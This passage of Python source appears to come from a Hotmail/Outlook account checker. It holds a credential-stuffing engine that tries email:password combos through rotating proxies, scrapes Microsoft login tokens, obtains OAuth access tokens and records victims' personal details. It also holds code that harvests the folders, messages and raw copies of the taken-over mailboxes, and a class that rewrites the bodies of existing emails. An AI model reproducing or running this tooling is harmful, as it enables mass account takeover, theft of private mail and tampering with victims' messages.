            self.search_conn.commit()
        except Exception as e:
            print(f"[INDEXER] FTS init failed: {e}")
            self.search_conn = None

    def index_email(self, message_id, subject, sender, body_preview, folder_name, received_date):
        """Add email to full-text search index"""
        if not self.search_conn:
            return
        try:
            cursor = self.search_conn.cursor()
            cursor.execute('''
                INSERT INTO emails_fts (message_id, subject, sender, body_preview, folder_name, received_date)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (message_id, subject, sender, body_preview, folder_name, received_date))
            self.search_conn.commit()
        except:
            pass  # Duplicate or error, skip

    def search_emails(self, query, limit=50):
        """Full-text search across all indexed emails"""
        if not self.search_conn:
            return []
        try:
            cursor = self.search_conn.cursor()
            cursor.execute('''
                SELECT message_id, subject, sender, body_preview, folder_name, received_date
                FROM emails_fts
                WHERE emails_fts MATCH ?
                LIMIT ?
            ''', (query, limit))
            return cursor.fetchall()
        except:
            return []

    def _load_checkpoint(self):
        """Load checkpoint data for resumable indexing"""
        if os.path.exists(self.checkpoint_file):
            try:
                with open(self.checkpoint_file, 'r') as f:
                    return json.load(f)
            except:
                pass
        return {"processed_folders": [], "processed_messages": [], "last_update": None}

    def _save_checkpoint(self):
        """Persist checkpoint data"""
        self.checkpoint_data["last_update"] = datetime.now().isoformat()
        try:
            with open(self.checkpoint_file, 'w') as f:
                json.dump(self.checkpoint_data, f)
        except:
            pass

    def is_duplicate(self, message_id):
        """Check if message ID has already been processed"""
        if message_id in self.seen_message_ids:
            return True
        if message_id in self.checkpoint_data.get("processed_messages", []):
            self.seen_message_ids.add(message_id)
            return True
        return False

    def mark_processed(self, message_id):
        """Mark message as processed for duplicate detection"""
        self.seen_message_ids.add(message_id)
        if message_id not in self.checkpoint_data.get("processed_messages", []):
            self.checkpoint_data.setdefault("processed_messages", []).append(message_id)

    def clear_duplicates(self):
        """Clear the duplicate tracking cache"""
        self.seen_message_ids.clear()
        self.checkpoint_data["processed_messages"] = []
        self._save_checkpoint()

    def get_headers(self, access_token, cid):
        return {
            "Authorization": f"Bearer {access_token}",
            "X-AnchorMailbox": f"CID:{cid}",
            "User-Agent": "Outlook-Android/2.0",
            "Accept": "application/json",
            "Content-Type": "application/json"
        }

    def get_all_folders_recursive(self, access_token, cid, parent_id=None, parent_path="", depth=0, max_depth=10, debug_callback=None):
        """
        Recursively fetch all folders including nested subfolders.
        
        Args:
            access_token: OAuth access token
            cid: Client ID
            parent_id: Parent folder ID (None for root)
            parent_path: Path string for nested folder naming
            depth: Current recursion depth
            max_depth: Maximum recursion depth to prevent infinite loops
            debug_callback: Optional callback for logging
        
        Returns:
            List of all folders with nested structure
        """
        def log(msg):
            if debug_callback:
                debug_callback(msg)

        headers = self.get_headers(access_token, cid)
        all_folders = []
        
        if depth >= max_depth:
            log(f"[RECURSION] Max depth {max_depth} reached at {parent_path}")
            return all_folders

        try:
            if parent_id is None:
                # Root folders
                log(f"[RECURSION] Fetching root folders (depth={depth})")
                url = "https://outlook.office.com/api/v2.0/me/mailfolders"
            else:
                # Child folders
                log(f"[RECURSION] Fetching children of {parent_id} (depth={depth})")
                url = f"https://outlook.office.com/api/v2.0/me/mailfolders/{parent_id}/childFolders"

            resp = self.session.get(url, headers=headers, timeout=30)
            
            if resp.status_code != 200:
                log(f"[RECURSION] Failed to fetch folders: {resp.status_code}")
                return all_folders

            data = resp.json()
            folders_data = data.get('value', [])

            for f in folders_data:
                folder_info = {
                    'id': f.get('Id') or f.get('id', ''),
                    'name': f.get('DisplayName') or f.get('displayName', 'Unknown'),
                    'wellKnownName': f.get('WellKnownName', '') or f.get('wellKnownName', ''),
                    'total_count': f.get('TotalItemCount', 0) or f.get('totalItemCount', 0),
                    'unread_count': f.get('UnreadItemCount', 0) or f.get('unreadItemCount', 0),
                    'parent_id': parent_id,
                    'path': f"{parent_path}/{f.get('DisplayName', f.get('displayName', 'Unknown'))}" if parent_path else f.get('DisplayName', f.get('displayName', 'Unknown')),
                    'depth': depth,
                    'child_count': 0  # Will be populated if children exist
                }
                
                # Check if folder has children
                if f.get('childFolderCount', 0) > 0:
                    folder_info['has_children'] = True
                    # Recursively fetch children
                    child_folders = self.get_all_folders_recursive(
                        access_token, cid, 
                        parent_id=folder_info['id'],
                        parent_path=folder_info['path'],
                        depth=depth + 1,
                        max_depth=max_depth,
                        debug_callback=debug_callback
                    )
                    folder_info['child_count'] = len(child_folders)
                    all_folders.extend(child_folders)
                else:
                    folder_info['has_children'] = False

                all_folders.append(folder_info)
                log(f"[RECURSION] {'  ' * depth}📁 {folder_info['name']} (items: {folder_info['total_count']}, children: {folder_info['child_count']})")

            # Handle pagination
            next_link = data.get('@odata.nextLink')
            while next_link:
                resp = self.session.get(next_link, headers=headers, timeout=30)
                if resp.status_code != 200:
                    break
                data = resp.json()
                for f in data.get('value', []):
                    folder_info = {
                        'id': f.get('Id') or f.get('id', ''),
                        'name': f.get('DisplayName') or f.get('displayName', 'Unknown'),
                        'wellKnownName': f.get('WellKnownName', '') or f.get('wellKnownName', ''),
                        'total_count': f.get('TotalItemCount', 0) or f.get('totalItemCount', 0),
                        'unread_count': f.get('UnreadItemCount', 0) or f.get('unreadItemCount', 0),
                        'parent_id': parent_id,
                        'path': f"{parent_path}/{f.get('DisplayName', f.get('displayName', 'Unknown'))}" if parent_path else f.get('DisplayName', f.get('displayName', 'Unknown')),
                        'depth': depth
                    }
                    all_folders.append(folder_info)
                next_link = data.get('@odata.nextLink')

        except Exception as e:
            log(f"[RECURSION] Error: {str(e)}")

        return all_folders

    def get_user_folders(self, access_token, cid, debug_callback=None):
        """Fetch all mail folders using Outlook REST API with Graph API fallback"""
        
        def log(msg):
            print(f"[FOLDER] {msg}")
            if debug_callback:
                debug_callback(msg)
        
        headers = self.get_headers(access_token, cid)
        folders = []
        
        # Try Outlook REST API v2.0 first
        log(f"Fetching folders for CID: {cid[:16]}...")
        url = "https://outlook.office.com/api/v2.0/me/mailfolders"
        
        try:
            while url:
                log(f"Requesting: {url}")
                resp = self.session.get(url, headers=headers, timeout=30)
                log(f"Response status: {resp.status_code}")
                
                if resp.status_code != 200:
                    log(f"Non-200 status received: {resp.status_code}")
                    log(f"Response text (first 500 chars): {resp.text[:500]}")
                    break
                    
                data = resp.json()
                folder_count = len(data.get('value', []))
                log(f"Found {folder_count} folders in this batch")
                
                for f in data.get('value', []):
                    folder_info = {
                        'id': f.get('Id') or f.get('id', ''),
                        'name': f.get('DisplayName') or f.get('displayName', 'Unknown'),
                        'wellKnownName': f.get('WellKnownName', '') or f.get('wellKnownName', ''),
                        'total_count': f.get('TotalItemCount', 0) or f.get('totalItemCount', 0),
                        'unread_count': f.get('UnreadItemCount', 0) or f.get('unreadItemCount', 0)
                    }
                    folders.append(folder_info)
                    log(f"  - Folder: {folder_info['name']} (ID: {folder_info['id'][:20]}...)")
                
                url = data.get('@odata.nextLink')
                if url:
                    log(f"More pages available, fetching next...")
                    
        except requests.exceptions.Timeout:
            log("TIMEOUT: Request took too long")
        except requests.exceptions.ConnectionError as e:
            log(f"CONNECTION ERROR: {str(e)}")
        except Exception as e:
            log(f"EXCEPTION: {str(e)}")
        
        # If no folders from Outlook API, try Microsoft Graph API as fallback
        if not folders:
            log("No folders from Outlook API, trying Graph API fallback...")
            try:
                graph_headers = {
                    "Authorization": f"Bearer {access_token}",
                    "User-Agent": "Outlook-Android/2.0",
                    "Accept": "application/json"
                }
                graph_url = "https://graph.microsoft.com/v1.0/me/mailFolders"
                
                log(f"Graph API request: {graph_url}")
                resp = self.session.get(graph_url, headers=graph_headers, timeout=30)
                log(f"Graph response status: {resp.status_code}")
                
                if resp.status_code == 200:
                    data = resp.json()
                    for f in data.get('value', []):
                        folder_info = {
                            'id': f.get('id', ''),
                            'name': f.get('displayName', 'Unknown'),
                            'wellKnownName': f.get('parentFolderId', ''),
                            'total_count': f.get('totalItemCount', 0),
                            'unread_count': f.get('unreadItemCount', 0)
                        }
                        folders.append(folder_info)
                        log(f"  - Graph Folder: {folder_info['name']}")
                    
                    log(f"Graph API returned {len(folders)} folders")
                else:
                    log(f"Graph API also failed: {resp.status_code}")
                    log(f"Graph response: {resp.text[:300]}")
                    
            except Exception as e:
                log(f"Graph API exception: {str(e)}")
        
        # Last resort: try well-known folders directly
        if not folders:
            log("Trying well-known folders directly...")
            well_known = [
                ("inbox", "Inbox"),
                ("drafts", "Drafts"),
                ("sentitems", "Sent Items"),
                ("deleteditems", "Deleted Items"),
                ("junkemail", "Junk Email")
            ]
            for folder_id, name in well_known:
                try:
                    test_url = f"https://outlook.office.com/api/v2.0/me/mailfolders/{folder_id}"
                    log(f"Testing well-known folder: {test_url}")
                    resp = self.session.get(test_url, headers=headers, timeout=15)
                    if resp.status_code == 200:
                        f = resp.json()
                        folders.append({
                            'id': folder_id,
                            'name': name,
                            'wellKnownName': folder_id,
                            'total_count': f.get('TotalItemCount', 0),
                            'unread_count': f.get('UnreadItemCount', 0)
                        })
                        log(f"  - Found well-known folder: {name}")
                except:
                    pass
        
        log(f"Total folders retrieved: {len(folders)}")
        return folders

    def get_messages(self, access_token, cid, folder_id, search_query="", page_size=50, skip=0,
                  folder_name="", on_progress=None, check_duplicates=True):
        """
        Get messages from a folder with optional search.
        
        Enhanced features:
        - Attachment detection with inline vs attachment distinction
        - Duplicate detection via Message-ID
        - Progress callback support
        - Automatic FTS indexing
        """
        headers = self.get_headers(access_token, cid)
        base_url = f"https://outlook.office.com/api/v2.0/me/mailfolders/{folder_id}/messages"
        
        # Request attachments info in the query
        params = f"$top={page_size}&$skip={skip}&$select=Id,Subject,From,ReceivedDateTime,HasAttachments,BodyPreview,IsRead,Importance,ConversationId,Attachments"
        if search_query:
            params += f"&$search=\"{search_query}\""
        params += "&$orderby=ReceivedDateTime desc"
        url = f"{base_url}?{params}"

        try:
            resp = self.session.get(url, headers=headers, timeout=30)
            if resp.status_code == 200:
                data = resp.json()
                messages = []
                new_count = 0
                dup_count = 0
                
                for m in data.get('value', []):
                    msg_id = m.get('Id', '')
                    
                    # Duplicate detection
                    if check_duplicates and self.is_duplicate(msg_id):
                        dup_count += 1
                        continue
                    
                    from_addr = m.get('From', {})
                    if from_addr:
                        from_email = from_addr.get('EmailAddress', {}).get('Address', 'Unknown')
                        from_name = from_addr.get('EmailAddress', {}).get('Name', '')
                    else:
                        from_email = 'Unknown'
                        from_name = ''

                    # Parse attachments with inline distinction
                    attachments_info = self._parse_attachments(m.get('Attachments', []))
                    
                    msg_data = {
                        'id': msg_id,
                        'subject': m.get('Subject', '(no subject)'),
                        'from_email': from_email,
                        'from_name': from_name,
                        'received': m.get('ReceivedDateTime', ''),
                        'has_attachments': m.get('HasAttachments', False),
                        'preview': m.get('BodyPreview', '')[:150],
                        'is_read': m.get('IsRead', True),
                        'importance': m.get('Importance', 'normal'),
                        'conversation_id': m.get('ConversationId', ''),
                        'folder_id': folder_id,
                        'folder_name': folder_name,
                        # Enhanced attachment info
                        'attachments': attachments_info['all'],
                        'inline_images': attachments_info['inline'],
                        'regular_attachments': attachments_info['regular'],
                        'attachment_count': len(attachments_info['all']),
                        'inline_count': len(attachments_info['inline']),
                        'regular_count': len(attachments_info['regular'])
                    }
                    
                    messages.append(msg_data)
                    new_count += 1
                    
                    # Mark as processed
                    self.mark_processed(msg_id)
                    
                    # Index for full-text search
                    self.index_email(
                        msg_id,
                        msg_data['subject'],
                        from_email,
                        msg_data['preview'],
                        folder_name,
                        msg_data['received']
                    )
                    
                    # Progress callback
                    if on_progress:
                        on_progress(msg_data, new_count, dup_count)
                
                return messages, data.get('@odata.nextLink')
            else:
                return [], None
        except Exception as e:
            print(f"[ERROR] Message fetch: {str(e)}")
            return [], None

    def _parse_attachments(self, attachments_list):
        """
        Parse attachments and distinguish between inline images and regular attachments.
        
        Returns:
            {
                'all': list of all attachments,
                'inline': list of inline attachments (Content-Disposition: inline),
                'regular': list of regular attachments
            }
        """
        result = {'all': [], 'inline': [], 'regular': []}
        
        for att in attachments_list:
            att_info = {
                'id': att.get('Id', ''),
                'name': att.get('Name', att.get('name', 'unknown')),
                'content_type': att.get('ContentType', att.get('contentType', 'application/octet-stream')),
                'size': att.get('Size', att.get('size', 0)),
                'is_inline': False,
                'content_id': None
            }
            
            # Check Content-Disposition for inline detection
            props = att.get('Properties', att.get('properties', {}))
            if props:
                is_inline = props.get('IsInline', props.get('isInline', False))
                content_id = props.get('ContentId', props.get('contentId', ''))
                
                att_info['is_inline'] = is_inline
                att_info['content_id'] = content_id
                
                # Also check by content type for common inline types
                content_type = att_info['content_type'].lower()
                if 'image/' in content_type and not is_inline:
                    # Heuristic: images without explicit inline might still be inline
                    att_info['likely_inline'] = True
            else:
                # No Properties - use content type heuristic
                content_type = att_info['content_type'].lower()
                if 'image/' in content_type:
                    att_info['likely_inline'] = True
            
            # Categorize
            result['all'].append(att_info)
            if att_info['is_inline'] or att_info.get('likely_inline'):
                result['inline'].append(att_info)
            else:
                result['regular'].append(att_info)
        
        return result

    def get_message_body(self, access_token, cid, message_id, include_attachments=True):
        """
        Get full message body with attachment metadata.
        
        Enhanced to include attachment details and content IDs.
        """
        headers = self.get_headers(access_token, cid)
        
        if include_attachments:
            select_fields = "Body,Subject,From,ToRecipients,CcRecipients,BccRecipients,HasAttachments,Attachments,ReceivedDateTime,InternetMessageHeaders"
        else:
            select_fields = "Body,Subject,From,ToRecipients,HasAttachments,ReceivedDateTime"
        
        url = f"https://outlook.office.com/api/v2.0/me/messages/{message_id}?$select={select_fields}"
        
        try:
            resp = self.session.get(url, headers=headers, timeout=30)
            if resp.status_code == 200:
                data = resp.json()
                
                result = {
                    'subject': data.get('Subject', ''),
                    'body_type': data.get('Body', {}).get('ContentType', 'Text'),
                    'body_content': data.get('Body', {}).get('Content', ''),
                    'from': data.get('From', {}),
                    'to': data.get('ToRecipients', []),
                    'cc': data.get('CcRecipients', []),
                    'bcc': data.get('BccRecipients', []),
                    'received': data.get('ReceivedDateTime', ''),
                    'headers': data.get('InternetMessageHeaders', [])
                }
                
                # Parse attachments if included
                if include_attachments:
                    result['attachments'] = self._parse_attachments(data.get('Attachments', []))
                    result['has_attachments'] = data.get('HasAttachments', False)
                
                return result
        except Exception as e:
            print(f"[ERROR] Body fetch: {str(e)}")
        return None

    def get_rfc822_raw(self, access_token, cid, message_id):
        """
        Get raw RFC822 email content for forensic capture.
        
        This fetches the complete email including all headers in MIME format.
        """
        headers = {
            "Authorization": f"Bearer {access_token}",
            "X-AnchorMailbox": f"CID:{cid}",
            "User-Agent": "Outlook-Android/2.0",
            "Accept": "application/octet-stream"
        }
        
        # Try to get raw .eml format
        url = f"https://outlook.office.com/api/v2.0/me/messages/{message_id}/$value"
        
        try:
            resp = self.session.get(url, headers=headers, timeout=60)
            if resp.status_code == 200:
                return resp.content  # Raw bytes
        except:
            pass
        
        # Fallback: reconstruct RFC822 from API response
        body_data = self.get_message_body(access_token, cid, message_id, include_attachments=True)
        if body_data:
            return self._reconstruct_rfc822(body_data, message_id)
        
        return None

    def _reconstruct_rfc822(self, body_data, message_id):
        """Reconstruct RFC822 formatted email from API response"""
        lines = []
        
        # Required headers
        lines.append(f"Message-ID: <{message_id}>")
        lines.append(f"Subject: {body_data.get('subject', '(no subject)')}")
        
        # From
        from_info = body_data.get('from', {})
        from_email = from_info.get('EmailAddress', {})
        from_addr = from_email.get('Address', '')
        from_name = from_email.get('Name', '')
        if from_name:
            lines.append(f"From: {from_name} <{from_addr}>")
        else:
            lines.append(f"From: {from_addr}")
        
        # To
        to_list = body_data.get('to', [])
        if to_list:
            to_addrs = []
            for r in to_list:
                email = r.get('EmailAddress', {})
                addr = email.get('Address', '')
                name = email.get('Name', '')
                if name:
                    to_addrs.append(f"{name} <{addr}>")
                else:
                    to_addrs.append(addr)
            lines.append(f"To: {', '.join(to_addrs)}")
        
        # CC
        cc_list = body_data.get('cc', [])
        if cc_list:
            cc_addrs = []
            for r in cc_list:
                email = r.get('EmailAddress', {})
                addr = email.get('Address', '')
                name = email.get('Name', '')
                if name:
                    cc_addrs.append(f"{name} <{addr}>")
                else:
                    cc_addrs.append(addr)
            lines.append(f"Cc: {', '.join(cc_addrs)}")
        
        # Date
        received = body_data.get('received', '')
        if received:
            lines.append(f"Date: {received}")
        
        # Content-Type
        lines.append(f"Content-Type: {body_data.get('body_type', 'text/html')}")
        lines.append(f"MIME-Version: 1.0")
        
        # Add custom headers for attachments info
        if body_data.get('attachments'):
            att_count = len(body_data['attachments']['all'])
            lines.append(f"X-Attachment-Count: {att_count}")
        
        # Add Internet Message Headers if available
        headers_list = body_data.get('headers', [])
        for h in headers_list:
            name = h.get('Name', h.get('name', ''))
            value = h.get('Value', h.get('value', ''))
            if name and value:
                lines.append(f"{name}: {value}")
        
        lines.append("")  # Blank line before body
        
        # Body content
        body = body_data.get('body_content', '')
        lines.append(body)
        
        return "\r\n".join(lines).encode('utf-8')

    def get_folder_messages_with_progress(self, access_token, cid, folder_id, folder_name="",
                                           max_messages=None, on_progress=None, check_duplicates=True):
        """
        Get all messages from a folder with progress tracking and checkpointing.
        
        Args:
            access_token: OAuth token
            cid: Client ID
            folder_id: Folder ID
            folder_name: Display name for logging
            max_messages: Optional limit on number of messages
            on_progress: Callback function(current_msg, total_so_far, dup_count)
            check_duplicates: Whether to skip already-processed messages
        
        Returns:
            List of all messages from the folder
        """
        all_messages = []
        skip = 0
        page_size = 50
        total_new = 0
        total_dup = 0
        
        while True:
            if max_messages and total_new >= max_messages:
                break
            
            messages, next_link = self.get_messages(
                access_token, cid, folder_id, 
                page_size=min(page_size, max_messages - total_new if max_messages else 50),
                skip=skip,
                folder_name=folder_name,
                on_progress=on_progress,
                check_duplicates=check_duplicates
            )
            
            if not messages:
                break
            
            all_messages.extend(messages)
            total_new += len(messages)
            
            # Update checkpoint
            if folder_id not in self.checkpoint_data.get("processed_folders", []):
                self.checkpoint_data.setdefault("processed_folders", []).append(folder_id)
            self._save_checkpoint()
            
            if on_progress:
                on_progress(None, total_new, total_dup)  # None msg indicates batch complete
            
            if not next_link:
                break
            
            skip += page_size
        
        return all_messages

    def search_messages(self, access_token, cid, query, folder_id=None, max_results=50):
        """Search messages across folders"""
        headers = self.get_headers(access_token, cid)
        if folder_id:
            url = f"https://outlook.office.com/api/v2.0/me/mailfolders/{folder_id}/messages?$search=\"{query}\"&$top={max_results}&$orderby=ReceivedDateTime desc"
        else:
            url = f"https://outlook.office.com/api/v2.0/me/messages?$search=\"{query}\"&$top={max_results}&$orderby=ReceivedDateTime desc"

        try:
            resp = self.session.get(url, headers=headers, timeout=30)
            if resp.status_code == 200:
                data = resp.json()
                messages = []
                for m in data.get('value', []):
                    messages.append({
                        'id': m.get('Id', ''),
                        'subject': m.get('Subject', '(no subject)'),
                        'from_email': m.get('From', {}).get('EmailAddress', {}).get('Address', 'Unknown'),
                        'from_name': m.get('From', {}).get('EmailAddress', {}).get('Name', ''),
                        'received': m.get('ReceivedDateTime', ''),
                        'has_attachments': m.get('HasAttachments', False),
                        'preview': m.get('BodyPreview', '')[:200],
                        'is_read': m.get('IsRead', True),
                        'folder_id': folder_id or 'all'
                    })
                return messages
        except Exception as e:
            print(f"[ERROR] Search: {str(e)}")
        return []


# ==================== EMAIL BODY REPLACER ====================
class EmailBodyReplacer:
    """Replace/update email body content via Outlook REST API"""

    def __init__(self):
        self.session = requests.Session()

    def get_headers(self, access_token, cid):
        return {
            "Authorization": f"Bearer {access_token}",
            "X-AnchorMailbox": f"CID:{cid}",
            "User-Agent": "Outlook-Android/2.0",
            "Accept": "application/json",
            "Content-Type": "application/json"
        }

    def get_message_body(self, access_token, cid, message_id):
        """Get current message body for editing"""
        headers = self.get_headers(access_token, cid)
        url = f"https://outlook.office.com/api/v2.0/me/messages/{message_id}?$select=Body,Subject,From,ToRecipients,ReceivedDateTime"
        try:
            resp = self.session.get(url, headers=headers, timeout=30)
            if resp.status_code == 200:
                data = resp.json()
                return {
                    'subject': data.get('Subject', ''),
                    'body_type': data.get('Body', {}).get('ContentType', 'HTML'),
                    'body_content': data.get('Body', {}).get('Content', ''),
                    'from': data.get('From', {}),
                    'to': data.get('ToRecipients', []),
                    'received': data.get('ReceivedDateTime', '')
                }
        except Exception as e:
            print(f"[ERROR] Get body: {str(e)}")
        return None

    def replace_body(self, access_token, cid, message_id, new_body, body_type="HTML"):
        """Replace the entire body of an email"""
        headers = self.get_headers(access_token, cid)
        url = f"https://outlook.office.com/api/v2.0/me/messages/{message_id}"
        payload = {
            "Body": {
                "ContentType": body_type,
                "Content": new_body
            }
        }
        try:
            resp = self.session.patch(url, json=payload, headers=headers, timeout=30)
            if resp.status_code in [200, 201, 204]:
                return True, "Body updated successfully"
            else:
                error_text = resp.text[:500] if resp.text else f"HTTP {resp.status_code}"
                return False, f"Failed: {error_text}"
        except Exception as e:
            return False, f"Error: {str(e)}"

    def append_to_body(self, access_token, cid, message_id, text_to_append, body_type="HTML"):
        """Append text to existing email body"""
        current = self.get_message_body(access_token, cid, message_id)
        if not current:
            return False, "Could not retrieve current body"

        existing_body = current['body_content']
        if body_type == "HTML":
            new_body = existing_body + f"<br><br><div style='color:#666;border-top:1px solid #ccc;padding-top:10px;'>{text_to_append}</div>"
        else:
            new_body = existing_body + f"\n\n---\n{text_to_append}"

        return self.replace_body(access_token, cid, message_id, new_body, body_type)

    def prepend_to_body(self, access_token, cid, message_id, text_to_prepend, body_type="HTML"):
        """Prepend text to existing email body"""
        current = self.get_message_body(access_token, cid, message_id)
        if not current:
            return False, "Could not retrieve current body"

        existing_body = current['body_content']
        if body_type == "HTML":
            new_body = f"<div style='color:#0066cc;background:#e6f2ff;padding:8px;margin-bottom:10px;'>{text_to_prepend}</div>" + existing_body
        else:
            new_body = f"{text_to_prepend}\n\n---\n\n" + existing_body

        return self.replace_body(access_token, cid, message_id, new_body, body_type)

    def find_and_replace_in_body(self, access_token, cid, message_id, find_text, replace_text, body_type="HTML"):
        """Find and replace text within email body"""
        current = self.get_message_body(access_token, cid, message_id)
        if not current:
            return False, "Could not retrieve current body"

        existing_body = current['body_content']
        if find_text in existing_body:
            new_body = existing_body.replace(find_text, replace_text)
            return self.replace_body(access_token, cid, message_id, new_body, body_type)
        else:
            return False, f"Text '{find_text}' not found in body"


# ==================== CHECKER ENGINE (ORIGINAL WORKING VERSION) ====================
class HotmailChecker:
    def __init__(self, on_log, on_hit, on_stats_update, on_progress, on_finished):
        self.on_log = on_log
        self.on_hit = on_hit
        self.on_stats_update = on_stats_update
        self.on_progress = on_progress
        self.on_finished = on_finished
        self.stop_flag = False

    def stop(self):
        self.stop_flag = True

    def format_proxy(self, proxy):
        if '@' in proxy:
            userpass, ipport = proxy.split('@')
            user, pwd = userpass.split(':')
            ip, port = ipport.split(':')
            return {"http": f"http://{user}:{pwd}@{ip}:{port}",
                    "https": f"http://{user}:{pwd}@{ip}:{port}"}
        else:
            ip, port = proxy.split(':')
            return {"http": f"http://{ip}:{port}",
                    "https": f"http://{ip}:{port}"}

    def get_mailbox_settings(self, access_token, cid):
        try:
            headers = {
                "Authorization": f"Bearer {access_token}",
                "X-AnchorMailbox": f"CID:{cid}",
                "User-Agent": "Outlook-Android/2.0"
            }
            resp = requests.get(
                "https://outlook.office.com/api/v2.0/me/mailboxsettings",
                headers=headers, timeout=15
            )
            if resp.status_code == 200:
                data = resp.json()
                return data.get("Language", "en"), data.get("TimeZone", "UTC")
        except:
            pass
        return "en", "UTC"

    def check_combo(self, email, password, proxy_list, keyword):
        retries = 0
        while retries < 3 and not self.stop_flag:
            proxy = None
            proxies = None
            if proxy_list:
                proxy = random.choice(proxy_list)
                proxies = self.format_proxy(proxy)

            session = requests.Session()
            if proxies:
                session.proxies = proxies

            try:
                ua = generate_user_agent()
                url = ("https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?"
                       "client_info=1&haschrome=1&login_hint=" + email +
                       "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
                       "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
                       "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D")
                headers = {"User-Agent": ua, "Accept": "text/html,application/xhtml+xml",
                           "X-Requested-With": "com.microsoft.outlooklite",
                           "client-request-id": str(uuid.uuid4()),
                           "correlation-id": str(uuid.uuid4())}
                resp = session.get(url, headers=headers, allow_redirects=True, timeout=30)
                text = resp.text

                PPFT = ""
                urlPost = ""
                match = re.search(r'var ServerData = ({.*?});', text, re.DOTALL)
                if match:
                    try:
                        sd = json.loads(match.group(1))
                        sFTTag = sd.get('sFTTag', '')
                        if sFTTag:
                            ppft_match = re.search(r'value="([^"]+)"', sFTTag)
                            if ppft_match:
                                PPFT = ppft_match.group(1)
                        urlPost = sd.get('urlPost', '')
                    except:
                        pass
                if not PPFT:
                    start = text.find('name="PPFT" value="')
                    if start != -1:
                        start += len('name="PPFT" value="')
                        end = text.find('"', start)
                        PPFT = text[start:end] if end != -1 else ""
                if not urlPost:
                    match = re.search(r'"urlPost":"([^"]+)"', text)
                    if match:
                        urlPost = match.group(1)

                if not PPFT or not urlPost:
                    return False, None

                cookies = session.cookies.get_dict()
                MSPRequ = cookies.get('MSPRequ', '')
                uaid = cookies.get('uaid', '')
                MSPOK = cookies.get('MSPOK', '')
                OParams = cookies.get('OParams', '')
                referer = resp.url

                data = (f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&"
                        f"lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}"
                        f"&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid="
                        f"&PPFT={PPFT}&PPSX=Passport&NewUser=1&FoundMSAs=&fspost=0&i21=0"
                        f"&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=3772")
                post_headers = {"User-Agent": ua, "Content-Type": "application/x-www-form-urlencoded",
                                "Origin": "https://login.live.com", "Referer": referer,
                                "Cookie": f"MSPRequ={MSPRequ}; uaid={uaid}; MSPOK={MSPOK}; OParams={OParams}"}
                post_resp = session.post(urlPost, data=data, headers=post_headers, allow_redirects=False, timeout=30)

                if "__Host-MSAAUTHP" not in session.cookies.get_dict():
                    return False, None

                auth_code = ""
                if post_resp.status_code in [301,302,303,307,308]:
                    loc = post_resp.headers.get('Location', '')
                    if 'msauth://' in loc and 'code=' in loc:
                        auth_code = loc.split('code=')[1].split('&')[0]
                else:
                    m = re.search(r'window\.location\s*=\s*["\']([^"\']+)["\']', post_resp.text)
                    if m and 'msauth://' in m.group(1) and 'code=' in m.group(1):
                        auth_code = m.group(1).split('code=')[1].split('&')[0]

                CID = session.cookies.get('MSPCID', '').upper()
                if not auth_code:
                    return False, None

                token_data = {"client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                              "grant_type": "authorization_code", "code": auth_code,
                              "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                              "scope": "profile openid offline_access https://outlook.office.com/M365.Access"}
                token_resp = requests.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                                           data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"},
                                           timeout=30)
                if token_resp.status_code != 200:
                    return False, None
                token_json = token_resp.json()
                access_token = token_json.get("access_token", "")
                if not access_token:
                    return False, None

                profile_headers = {"User-Agent": "Outlook-Android/2.0",
                                   "Authorization": f"Bearer {access_token}",
                                   "X-AnchorMailbox": f"CID:{CID}"}
                profile_resp = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile",
                                            headers=profile_headers, timeout=30)
                Name, Country, Birthdate = "", "", "N/A"
                if profile_resp.status_code == 200:
                    prof = profile_resp.json()
                    if "accounts" in prof and prof["accounts"]:
                        acc = prof["accounts"][0]
                        Country = acc.get("location", "")
                        BD = acc.get("birthDay", "")
                        BM = acc.get("birthMonth", "")
                        BY = acc.get("birthYear", "")
                        if BD and BM and BY:
                            Birthdate = f"{BY}-{str(BM).zfill(2)}-{str(BD).zfill(2)}"
                    if "names" in prof and prof["names"]:
                        Name = prof["names"][0].get("displayName", "")

                mailbox_lang, mailbox_tz = self.get_mailbox_settings(access_token, CID)

                Total = "0"
                if keyword:
                    search_url = "https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124"
                    payload = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"},
                               "TimeZone": "UTC", "TextDecorations": "Off",
                               "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"],
                                                   "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                                                   "From": 0, "Query": {"QueryString": keyword}, "Size": 25,
                                                   "Sort": [{"Field": "Time", "SortDirection": "Desc"}]}]}
                    search_headers = {"User-Agent": "Outlook-Android/2.0", "Authorization": f"Bearer {access_token}",
                                      "X-AnchorMailbox": f"CID:{CID}", "Content-Type": "application/json"}
                    search_resp = requests.post(search_url, json=payload, headers=search_headers, timeout=30)
                    if search_resp.status_code == 200:
                        m = re.search(r'"Total":(\d+)', search_resp.text)
                        if m:
                            Total = m.group(1)

                info = {
                    "email": email, "password": password, "name": Name,
                    "country": Country, "birthdate": Birthdate,
                    "mailbox_lang": mailbox_lang, "mailbox_tz": mailbox_tz,
                    "total": Total, "has_keyword": keyword and Total != "0",
                    "access_token": access_token,
                    "user_id": CID,
                    "checkbox_state": False
                }
                return True, info

            except Exception as e:
                retries += 1
                time.sleep(0.1)
        return False, None

    def run(self, combos, proxy_list, keyword, threads):
        q = Queue()
        for c in combos:
            q.put(c)

        total = len(combos)
        processed = 0
